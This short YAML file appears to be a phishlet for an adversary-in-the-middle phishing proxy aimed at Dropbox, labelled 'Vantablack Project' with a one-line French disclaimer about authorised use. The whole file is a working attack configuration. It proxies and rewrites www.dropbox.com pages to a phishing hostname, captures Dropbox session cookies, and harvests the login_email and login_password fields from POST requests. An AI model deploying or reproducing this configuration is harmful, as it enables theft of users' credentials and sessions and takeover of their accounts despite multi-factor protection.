# VANTABLACK PROJECT | ETHICAL DISCLAIMER: USAGE AUTORISÉ UNIQUEMENT
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'dropbox.com', session: true, is_landing: true}
sub_filters:
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: 'https://www.dropbox.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
auth_tokens:
  - domain: '.dropbox.com'
    keys: ['t', 'jar', 'locale', 'lid']
credentials:
  username:
    key: 'login_email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'login_password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'www.dropbox.com'
  path: '/login'
